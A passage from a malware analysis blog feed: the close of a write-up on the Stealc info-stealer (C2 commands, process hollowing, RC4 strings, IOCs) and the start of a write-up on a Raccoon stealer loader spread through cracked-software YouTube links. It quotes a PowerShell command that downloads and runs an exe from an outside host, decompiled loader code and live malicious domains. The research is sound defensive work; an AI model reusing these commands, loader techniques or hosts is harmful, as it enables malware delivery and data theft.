<pre><code class="language-String" data-lang="String">Response_ID --&gt; uVX1bTFdMmzgD2nW
Response_UUID --&gt; 25caaa27-f98f-41a8-b3e2-e3b86f2e45ba
Response_Data(decrypted) --&gt; whoami
</code></pre><p>My victim machine executed the <code>whoami</code> command, encrypted the response, and sent it back to the C2.</p>
<p>After this, the <code>c2_comms</code> method executed once every 75 seconds, but the C2 did not respond again for several hours.</p>
<p>Roughly eight hours later, this series of commands was issued from the remote server:</p>
<pre><code class="language-String" data-lang="String">ls c:\
$clients1 = new-object System.Net.WebClient;$clients1.DownLoadFile('http://ec2-18-191-188-207.us-east-2.compute.amazonaws.com/T7YHUE/123',&quot;c:\programdata\123.exe&quot;);
c:\programdata\123.exe
systeminfo
rm -r c:\programdata\123.exe
</code></pre><p>My victim machine is a VM and I didn&rsquo;t make any attempts to alter the responses to the commands, so the result of <code>systeminfo</code> will have alerted the TA that the victim is likely a sandbox or a researcher. I let the beacon run for a few more hours, but the server never responded again.</p>
<p>No matter, I still have the URI for the next stage. I can download the <code>123.exe</code> file and continue analysis in the next section.</p>
<h2 id="dropper-123exe">Dropper: 123.exe</h2>
<p>DetectItEasy noted high entropy (7.25), and indicated the binary was packed.</p>
<p>Just to get a feel for what I was dealing with, I started with some dynamic analysis.</p>
<h3 id="dynamic-analysis">Dynamic Analysis</h3>
<p>With ProcessMonitor running, I executed the <code>123.exe</code> binary and observed it spawning the <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\AppLaunch.exe</code> process.</p>
<p>Interesting - I wonder if some sort of injection is taking place.</p>
<p>I utilized ProcessHacker to investigate this theory; I opened the memory tab of the <code>AppLaunch.exe</code> process and took a look at the strings.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/dynamic_analysis.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/dynamic_analysis.png"
            alt="dynamic_analysis"
            />
    </a>
    
</figure>
The memory tab shows an IP address as well as some other unusual strings, looks like the theory of process injection was correct, or at least on the right track.</p>
<p>The URI likely used to download <code>sqlite3.dll</code> hints this may be an info-stealer. The legitimate DLL is often used by malware to extract data like credit card info and passwords from victim machines.</p>
<p>A few more strings from the process memory solidify that theory:
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/stealer_string1.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/stealer_string1.png"
            alt="stealer_string1"
            />
    </a>
    
</figure>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/stealer_string2.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/stealer_string2.png"
            alt="stealer_string2"
            />
    </a>
    
</figure>
Looking further at the memory strings, I can guess that the injected process gathers information about the device and sends it back to the C2:
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/device_info.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/device_info.png"
            alt="device_info"
            />
    </a>
    
</figure>
After doing some basic dynamic analysis, I can safely assume the <code>123.exe</code> binary is a dropper for an info-stealer.</p>
<p>Let&rsquo;s move to x32dbg and see if I can learn more about the dropper and its payload.</p>
<h3 id="x32dbg-unpacking">x32dbg Unpacking</h3>
<p>It took me a few tries to get the APIs correctly identified; I knew unpacking and injection was taking place, so I started out by placing breakpoints on:</p>
<pre><code class="language-String" data-lang="String">VirtualProtect
VirtualAlloc
</code></pre><p>Note: I ran into some anti-analysis mechanisms, but I was able to easily bypass them by using the <code>Debug --&gt; Advanced Features --&gt; Hide debugger (PEB)</code> feature in x32dbg.</p>
<p>After a few runs, I was able to see a PE file was written to the memory allocated by VirtualAlloc - this is likely the unpacked payload.</p>
<p>However, I wanted to understand what type of injection was occurring, so I added a few more breakpoints.</p>
<p>First, the dropper uses <code>CreateProcessW</code> to create <code>AppLaunch.exe</code> in a suspended state, as indicated by the <code>dwCreationFlags</code> set to &ldquo;4&rdquo;. Upon creation, <code>ZwUnmapViewOfSection</code> is used to unmap memory in the newly created process.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/createprocessw.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/createprocessw.png"
            alt="createprocessw"
            />
    </a>
    
</figure>
Then, <code>VirtualAlloc</code> and <code>ntdll.memcpy</code> are invoked to write the unpacked payload into a region of memory, which is then written to the memory of the <code>AppLaunch.exe</code> process using <code>WriteProcessMemory</code>.</p>
<p>Finally, I hit a breakpoint on <code>NtResumeThread</code> which will take the <code>AppLaunch.exe</code> process out of the suspended state, and in doing so, execute the unpacked PE.</p>
<p>Note: Technically speaking, what has occurred is categorized as process hollowing, rather than injection, so my guess was close, but not quite accurate.</p>
<p>Now that I have reached the end of the unpacking stage, I can dump the unpacked payload from the memory of the hollowed process.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/end_of_hollowing.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/end_of_hollowing.png"
            alt="end_of_hollowing"
            />
    </a>
    
</figure>
Since the payload was mapped into memory, before I can analyze it I had to use PEBear to adjust the section table.<br>
With this done, I can move on to the next stage!</p>
<h2 id="final-payload-stealc">Final Payload: Stealc</h2>
<p>While performing initial observations in DetectItEasy, I noticed a large number of what looked like base64 encoded strings inside the payload. When decoded, they contained unintelligible data - likely encrypted somehow.</p>
<h3 id="string-decryption">String Decryption</h3>
<p>After running the binary in x32dbg, I observed the first function looked like it was performing string decryption.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/string_decryption.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/string_decryption.png"
            alt="string_decryption"
            />
    </a>
    
</figure>
On a guess, I tried using Cyberchef with one of the base64 encoded strings and the above highlighted 20 digit string as an RC4 key. It decrypted an intelligible string! Now I know the binary uses a combination of base64 and RC4 to hide the contents of the strings.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/rdata.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/rdata.png"
            alt="rdata"
            />
    </a>
    
</figure>
For fun, I decided to make a Python string decryption script to parse any encrypted strings from the PE. Since the RC4 key and the base64 string are in plaintext in the <code>.rdata</code> section, this was not too difficult. The script can be found <a href="https://gist.github.com/rerednawyerg/6b6ff1ee6ed701f656e235a6d9cd460f">here, on my Github</a>.</p>
<p>With the script working, I used it to extract all the decrypted strings and added them to <a href="https://pastebin.com/T0g7Laf0">Pastebin</a>.</p>
<h3 id="identification">Identification</h3>
<p>Now it&rsquo;s time to try and identify the sample. Googling one of the strings (<code>&quot;Country: ISO?&quot;</code>) found in the <code>AppLaunch.exe</code>'s memory, I came across a fantastic blog post from <a href="https://blog.sekoia.io/stealc-a-copycat-of-vidar-and-raccoon-infostealers-gaining-in-popularity-part-1/">Sekoia.io</a>, describing a newly observed info-stealer called &ldquo;Stealc&rdquo;.</p>
<p>The technical analysis portion of the blog lines up exactly with the activity I have seen in this sample, so I can safely conclude the malware is in fact, the &ldquo;Stealc&rdquo; information stealer.</p>
<p>Since the blog goes into such great detail, I&rsquo;ll stop my analysis here, but would recommending giving both Part 1 and Part 2 of the Sekoia blog a read.</p>
<h2 id="final-words">Final Words</h2>
<p>Google malvertising seems to have made a brief resurgence, but in the time it took me to complete this writeup, the levels I have been able to detect have decreased to almost nothing. Hopefully this indicates Google is cracking down on bad actors abusing the system.</p>
<p>As always, please feel free to send me feedback regarding anything in this writeup - I&rsquo;m always looking to improve and learn more. My contact details can be found on the home page.</p>
<h3 id="iocs">IOCs</h3>
<h5 id="_initial-stage_"><em>Initial Stage</em></h5>
<ul>
<li>givingspirit[.]us</li>
<li>advanced-ip-scanner[.]net</li>
<li>cdn-c08e638.azureedge[.]net/download.html?q=ipscanner</li>
<li>www.dropbox[.]com/s/8b79t04dohaf82t/Advanced_IP_Scanner_2.5.4594.1.exe?dl=1</li>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=e43267c46ad32010ba1ad305d9ef300b207707090be144ac076d139137230cce">Malshare Link</a></li>
</ul>
<h5 id="_dropper_"><em>Dropper</em></h5>
<ul>
<li>snow.cdn-b1d8e9.workers[.]dev</li>
<li>api-cdn12.azureedge[.]net</li>
</ul>
<h5 id="_stealer_"><em>Stealer</em></h5>
<ul>
<li>31.41.244.65</li>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=fd2383852f04845bce0c3368405d2011b181051d2c89a3b76943c358c3cfa6ac">Malshare Link</a></li>
</ul>
<h5 id="_rc4-key_"><em>RC4 Key</em></h5>
<ul>
<li>83592471861675582409</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Raccoons Nesting In .NET</title>
            <link>https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/</link>
            <pubDate>Tue, 14 Mar 2023 14:35:27 -0600</pubDate>
            
            <guid>https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/</guid>
            <description>My latest writeup comes to us courtesy of YouTube, specifically via the plethora of videos claiming to share cracked versions of various software.
The initial steps were quite simple, I visited YouTube, searched for &amp;ldquo;cracked software&amp;rdquo;, sorted by the last hour, and voila, hundreds of videos.</description>
            <content type="html"><![CDATA[<hr>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="/js/pswp-init.js"></script>

<p>My latest writeup comes to us courtesy of YouTube, specifically via the plethora of videos claiming to share cracked versions of various software.</p>
<p>The initial steps were quite simple, I visited YouTube, searched for &ldquo;cracked software&rdquo;, sorted by the last hour, and voila, hundreds of videos. I chose one near the top, titled <code>&quot;elden ring crack | free download | 2022&quot;</code>.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/first_youtube_page.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/first_youtube_page.png"
            alt="first_youtube_page"
            />
    </a>
    
</figure>
<p>The video demonstrates to the viewer how to unzip the downloaded folder and run the software within by double-clicking it. Checking out the YouTube account, this was at one point an active account featuring the user&rsquo;s gameplay, but had been compromised by a threat actor.</p>
<p>As of 3/14/2023, three weeks after I initially viewed this account, the account, videos, and links are still present.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/compromised_youtube_account.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/compromised_youtube_account.png"
            alt="compromised_youtube_account"
            />
    </a>
    
</figure>
<p>Visiting the link in the video description brought me to a page on <code>telegra.ph</code>, a site which allows users to quickly create basic websites.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/telegra_ph.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/telegra_ph.png"
            alt="telegra_ph"
            />
    </a>
    
</figure>
<p>The link on the <code>telegra.ph</code> site landed on a MediaFire page where a RAR archive, <code>Pass_2023.rar</code>, could be downloaded.</p>
<p>Note: There was a another link shown in the video itself, and on visiting this URL a redirect chain is followed and a different RAR archive is served. I won&rsquo;t dig into this sample in this post, but wanted to share the IOCs.</p>
<p>Redirect Chain: <code>softwarebeginner.com/eldenringcrack</code> -&gt; <code>emanagesoftware.com/download</code> -&gt; <code>bestdogdaycaresoftware.com/1</code></p>
<p>-&gt; <code>bittab.pw/SoftwareSetupFile.rar</code></p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/mediafire.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/mediafire.png"
            alt="mediafire"
            />
    </a>
    
</figure>
<p>On providing the password &ldquo;2023&rdquo; to <code>Pass_2023.rar</code> and extracting the contents of the archive, I was presented with a file, setup.exe, and a directory containing what appeared to be random, unrelated files and folders.</p>
<p>My focus shifted to investigating the setup.exe file.</p>
<h2 id="stage-one---setupexe-aka-tankbattle">Stage One - Setup.exe aka TankBattle</h2>
<p>Originally, the file was quite large, nearly 800MB. Guessing that null bytes had been added by the threat actor to attempt to avoid AV scans, I used the <code>readpe</code> tool to find the size of the file and trimmed it down to a more manageable 958KB. This trimmed binary can be found on <a href="https://malshare.com/sample.php?action=detail&amp;hash=6e526899044545306d18de56b05f14112a20f0ab61def710c139ffba45292bbe">Malshare</a>.</p>
<p><code>setup.exe</code> is written in C# using the .NET framework, and on opening it in dnSpy, I had a few initial observations.</p>
<p>Firstly, there was no attempt at obfuscation whatsoever. Secondly, a majority of the code seemed to be benign and referencing a tank battle game, probably ripped from another legitimate project to assist avoiding detection. However, there were several sections which were obviously malicious.</p>
<p>Following the execution flow, I&rsquo;ll outline my findings starting with the constructor of the <code>Form1</code> class.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">Form1.Seksy = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">string</span>[]
{
	<span style="color:#e6db74">&#34;54784365&#34;</span>,
	<span style="color:#e6db74">&#34;737775&#34;</span>,
	<span style="color:#e6db74">&#34;TankBattle&#34;</span>
};
</code></pre></div><p>This in of itself is not malicious, but is used later on. Execution then moves to <code>Form1.InitializeComponent()</code>, where the remainder of the malicious code is added at random into the method. Most of the method is benign, so I will share only the malicious components.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">ResourceManager resourceManager = <span style="color:#66d9ef">new</span> ResourceManager(<span style="color:#66d9ef">typeof</span>(Form2));
<span style="color:#66d9ef">string</span> text = (<span style="color:#66d9ef">string</span>)resourceManager.GetObject(<span style="color:#e6db74">&#34;String1&#34;</span>);
text = text.Replace(<span style="color:#e6db74">&#34;~&#34;</span>, <span style="color:#e6db74">&#34;00-&#34;</span>);
<span style="color:#66d9ef">string</span>[] array = text.Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[]
{
	<span style="color:#e6db74">&#39;-&#39;</span>
});
<span style="color:#66d9ef">byte</span>[] array2 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[array.Length];
<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; array.Length; i++)
{
	array2[i] = (<span style="color:#66d9ef">byte</span>)Convert.ToUInt32(array[i], <span style="color:#ae81ff">16</span>);
}

Assembly assembly = Assembly.Load(array2);
<span style="color:#66d9ef">string</span>[] seksy = Form1.Seksy;
MethodInfo methodInfo = assembly.GetExportedTypes()[<span style="color:#ae81ff">1</span>].GetMethods()[<span style="color:#ae81ff">1</span>];
MethodBase methodBase = methodInfo;
<span style="color:#66d9ef">object</span> obj = <span style="color:#ae81ff">0</span>;
<span style="color:#66d9ef">object</span>[] parameters = seksy;
methodBase.Invoke(obj, parameters);
</code></pre></div><p>The first several lines extract a PE file from a resource embedded in <code>setup.exe</code>. The resource is called <code>String1</code> and is in the format <code>4D-5A-90-~03-~~~04-~~~FF-FF-~~B8-~~~~~~~40-~~~~~~~~~~~~~80-~~~0E-1F-</code>.</p>
<p>The tildes are replaced with null bytes, and the string is transformed into a byte array by splitting on the dash characters. The array is then passed as an argument to <code>Assembly.Load()</code>.</p>
<p>Using the dnSpy debugger, I was able to see the &ldquo;methodInfo&rdquo; variable represents <code>Melvin.White.Dodge()</code>, which must be a method in the newly created assembly. This method is invoked by passing the <code>Seksy</code> array as a parameter.</p>
<p>This brings us to the end of the first stage.</p>
<h2 id="stage-two-the-first-dll">Stage Two: The First DLL</h2>
<p>The extracted PE is a .NET DLL obfuscated with SmartAssembly. After running the DLL through de4dot, which recognized the obfuscation pattern and output a clean version, I created a .NET console wrapper application so I could debug the DLL in dnSpy.</p>
<p>After checking to ensure the <code>&lt;Module&gt;</code> constructor did not perform any actions, I started investigating the Dodge() method.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/dodge_method.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/dodge_method.png"
            alt="dodge_method"
            />
    </a>
    
</figure>
<p>Starting with line 6, the Class1 constructor loads an embedded resource, performs some DES decryption, and reads the result into a global byte array. Next, <code>smethod_0(107396853)</code> is called.</p>
<p>The argument to smethod_0 is used to calculate an index value and an offset value, which are then used to grab a specific set of bytes from the byte array. These bytes are decoded into UTF-8, base64 decoded, and returned.</p>
<p>After the string <code>s</code> is created using the method described above, it is base64 decoded again in line 7, and then passed into a custom method called <code>GZip</code>. This method, as might be expected by the name, performs Gzip decompression on the string passed to it, and returns yet another .NET DLL as a byte array. Going forward, I will refer to this new DLL by its assembly name, <code>Cruiser</code>.</p>
<p>Breaking down lines 8 and 9, the Class1.smethod_0 call returns the string <code>Munoz.Himentater</code> which is passed to GetType().</p>
<p>White.smethod_2() is actually just <code>Assembly.Load()</code>, so the &ldquo;type&rdquo; variable will hold an object that represents the <code>Munoz.Himentater</code> class from Cruiser, and &ldquo;obj&rdquo; is an object of the type <code>Munoz.Himentater</code>.</p>
<p>In lines 10-17, both calls to <code>Class1.smethod_0</code> return the string <code>CausalitySource</code>. This means <code>Munoz.Himentater.CausalitySource()</code> will be called twice, once with the argument <code>54784365</code> and again with the argument <code>737775</code> &ndash; recall the three arguments to the <code>Dodge()</code> method come from the <code>Seksy</code> array mentioned previously.</p>
<p>All <code>CausalitySource</code> does is convert hex to char, so now I know <code>StringTypeInfo</code> is equal to &ldquo;TxCe&rdquo; and <code>InputBlockSize</code> is equal to &ldquo;swu&rdquo;.</p>
<p>Here is where things got a bit tricky for me. On line 18, <code>White.LowestBreakIteration(&quot;TxCe&quot;, &quot;TankBattle&quot;)</code> is called.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/lowestbreakiteration.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/lowestbreakiteration.png"
            alt="lowestbreakiteration"
            />
    </a>
    
</figure>
<p>Issue number one - the arguments to create the ResourceManager instance are the string &ldquo;TankBattle.Properties.Resources&rdquo; and the result of the method Assembly.GetEntryAssembly(), meaning it will look for a resource under an assembly named &ldquo;TankBattle&rdquo;. I will not be able to use my wrapper executable in its current state if I want to continue debugging, I&rsquo;ll have to rename it to &ldquo;TankBattle&rdquo;.</p>
<p>Issue number two - my wrapper executable does not contain the resource <code>TankBattle.Properties.Resources.TxCe</code>, I will have to copy the <code>TxCe</code> resource out of the original .NET binary and add it to my wrapper.</p>
<p><figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/TxCe_resource.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/TxCe_resource.png"
            alt="txce_resource"
            />
    </a>
    
</figure>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/tank_battle_properties.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/tank_battle_properties.png"
            alt="tank_battle_properties"
            />
    </a>
    
</figure></p>
<p>After I had adjusted my .NET wrapper accordingly, I ran into one more snag. I have not created many .NET projects, and I was having a difficult time getting the resource to be stored in the correct location, the closest I could get was <code>TankBattle.Resources.TxCe</code>. Rather than try and figure it out, I simply used the debugger to make the argument match my wrapper&rsquo;s path right before creating the ResourceManager instance.</p>
<p><figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/second_shot_dodge.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/second_shot_dodge.png"
            alt="second_shot_dodge"
            />
    </a>
    
</figure>
Now I have reached line 19 and have a variable referencing a bitmap object. This variable is passed into the <code>White.smethod_0</code> method, which loops through each pixel, converts it to a 32-bit value, and stores that value as a byte in an array. A subset of the new array is then copied to another array, which is returned.</p>
<p>Looking at lines 20-24, I determined this new array would be modified as the result of invoking <code>Munoz.Himentater.SearchResult(array, &quot;swu&quot;)</code>. In the <code>SearchResult</code> method, each byte of the array is XOR&rsquo;d with a static value, and then XOR&rsquo;d again with a value selected by rotating through the &ldquo;swu&rdquo; string, which is converted to bytes in UTF-16BE format.</p>
<p>Surprise, surprise, the result of this method is yet another .NET DLL, which is loaded using <code>Assembly.Load()</code> in line 25.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/white_smethod_2_next_stage.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/white_smethod_2_next_stage.png"
            alt="white_smethod_2_next_stage"
            />
    </a>
    
</figure></p>
<p>To wrap up stage two, one last method is called before exiting the process.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/white_smethod1.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/white_smethod1.png"
            alt="white_smethod1"
            />
    </a>
    
</figure></p>
<p>Using the debugger to step through these calls, I was able to determine the method <code>Y4.pn.OcE()</code> would be invoked in the newly created DLL. This new DLL&rsquo;s assembly name is Outimurs, which I will use to refer to it.</p>
<p>With stage two complete, let&rsquo;s move on to stage three.</p>
<h2 id="stage-three-outimursdll">Stage Three: Outimurs.dll</h2>
<p>This next stage is heavily obfuscated and was much more difficult to walk through. It contains references to a <a href="https://github.com/itvieira/HIVacSim">legitimate .NET project</a> related to HIV infection simulation models, again likely included to deter investigation and AV scans.</p>
<p>The first thing I looked at here was the <code>&lt;Module&gt;</code> constructor.</p>
<h4 id="module-constructor">Module Constructor</h4>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/module_constructor.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/module_constructor.png"
            alt="module_constructor"
            />
    </a>
    
</figure>
<p>It looks simple, but unfortunately for me, the constructor for the <code>g3</code> class ends up being a bit more complex. I will attempt to outline it as best I can.</p>
<p>First, the a byte array is created by reading the resource <code>Y6MIKia1IugDfPiy07.AJLUQDvrspoMYIU61u</code>, and this array is used to create a dictionary of 635 key-value pairs, which all appear to hold .NET metadata tokens.</p>
<p>Next, the fields of class <code>g3</code> are looped through, and each field is assigned a delegate based on the dictionary value matching the field&rsquo;s metadata token as a key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#"><span style="color:#66d9ef">foreach</span> (FieldInfo fieldInfo <span style="color:#66d9ef">in</span> typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField))
{
	<span style="color:#66d9ef">int</span> metadataToken = fieldInfo.MetadataToken;
	<span style="color:#66d9ef">int</span> num25 = t49.dPf[metadataToken];
	<span style="color:#66d9ef">bool</span> flag = (num25 &amp; <span style="color:#ae81ff">1073741824</span>) &gt; <span style="color:#ae81ff">0</span>;
	num25 &amp;= <span style="color:#ae81ff">1073741823</span>;
	MethodInfo methodInfo = (MethodInfo)<span style="color:#66d9ef">typeof</span>(t49).Module.ResolveMethod(num25, typeFromHandle.GetGenericArguments(), <span style="color:#66d9ef">new</span> Type[<span style="color:#ae81ff">0</span>]);
	<span style="color:#66d9ef">if</span> (methodInfo.IsStatic)
	{
		fieldInfo.SetValue(<span style="color:#66d9ef">null</span>, Delegate.CreateDelegate(fieldInfo.FieldType, methodInfo));
	}
...
</code></pre></div><p>To illustrate, in the first line the metadataToken of the field <code>g3.Gy</code> is obtained, which is 0x040001DD. In the next line, using <code>t49.dPf</code> (the dictionary), get the value associated with key 0x040001DD and assign it to variable &ldquo;num25&rdquo;.
The value returned is 0x060003AE, which is the metadata token for <code>Y4.E4R.XOCxlz()</code>. A delegate is then created, so now, a call to <code>g3.Gy</code> will actually call <code>Y4.E4R.XOCxlz()</code>.</p>
<p>Note: This process is followed many more times throughout execution for various other classes. This made it difficult for me to know where I would be jumping to while debugging, which I&rsquo;d guess is the purpose.</p>
<p>After assigning delegates to all the fields in the <code>g3</code> class, I reached the end of the <code>&lt;Module&gt;</code> constructor.</p>
<p>Before I can determine what the call to <code>Y4.pn.OcE()</code> will do, I must first investigate the <code>pn</code> class constructor.</p>
<h4 id="pn-class-constructor">pn Class Constructor</h4>
<p>This constructor is rather more obfuscated than the last, but by walking through the steps with the debugger, I was able to gain a rough understanding. Firstly, it creates an array of Unicode characters using a hardcoded set of loops and array manipulation. I&rsquo;ve shared the entirety of the array <a href="https://pastebin.com/RW9GVuKK">here.</a></p>
<p>A few strings are extracted from specified indices of the array, and the third string below is split using the token <code>||</code>.</p>
<pre><code class="language-string" data-lang="string">zDJqayZgb

jf221efESkp

1||0||0||0||1||http://inijingo22dev.online/Tlv5quZrJBTUzqG.exe||Tlv5quZrJBTUzqG.exe||0||0||0||0||||||||||||||0||0||0||0||0||0||0||0||v4||2||13325||0||0||||||0||0||0||||0||0||0||1||
</code></pre><p>Each distinct value split from the third string is assigned to a field of the <code>pn</code> class.</p>
<p>Next, a series of methods are called to create pointers to library functions using strings extracted from the decoded data. The pointers are assigned to fields of the <code>pn</code> class as well.</p>
<pre><code class="language-strings" data-lang="strings">pn.TaF  --&gt; kernel32.ResumeThread
pn.jaE  --&gt; kernel32.Wow64SetThreadContext
pn.taL  --&gt; kernel32.SetThreadContext
pn.kap  --&gt; kernel32.Wow64GetThreadContext
pn.man  --&gt; kernel32.GetThreadContext
pn.PaP  --&gt; kernel32.VirtualAllocEx
pn.FaX  --&gt; kernel32.WriteProcessMemory
pn.Nab  --&gt; kernel32.ReadProcessMemory
pn.saA  --&gt; ntdll.ZwUnmapViewOfSection
pn.Da8  --&gt; kernel32.CreateProcessA
</code></pre><p>This brings us to the end of the <code>pn</code> constructor, now I can finally start digging into to the <code>Y4.pn.OcE()</code> method.</p>
<h4 id="y4pnoce-method">Y4.pn.OcE() Method</h4>
<p>The method is obfuscated using branching logical statements which make it large and difficult to read manually, but following it in the debugger I was able to extract the important pieces of the puzzle.</p>
<p>After jumping around multiple case statements, eventually <code>Y4.pn.zcu(&quot;http://inijingo22dev.online/Tlv5quZrJBTUzqG.exe&quot;, &quot;Tlv5quZrJBTUzqG.exe&quot;)</code> is called. This method creates a WebClient and downloads the specified file to the location <code>C:\Users\&lt;user&gt;\AppData\Local\Temp\Tlv5quZrJBTUzqG.exe</code>.</p>
<p>This newly downloaded file is identical in structure to the original Setup.exe binary. This might be a persistence mechanism, but I don&rsquo;t see any methods called to establish persistence. It is possible the functionality may be in place but not implemented properly.</p>
<p>I&rsquo;ll be honest here, the next bit I am a little confused about. The following is executed successfully:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">ResourceManager resourceManager = <span style="color:#66d9ef">new</span> ResourceManager(<span style="color:#e6db74">&#34;jf221efESkp&#34;</span>, GetExecutingAssembly())
</code></pre></div><p>However, there is no resource with that name. Maybe dnSpy failed to extract it, but I am not sure. The <code>Outimurs.dll</code> is <a href="https://malshare.com/sample.php?action=detail&amp;hash=214bba553a2b99bedc0a5ea3095498231fe628fa2642f7af4f592b15f5faa664">here</a> if any .NET gurus want to take a look.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/resources_outimurs.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/resources_outimurs.png"
            alt="resources_outimurs"
            />
    </a>
    
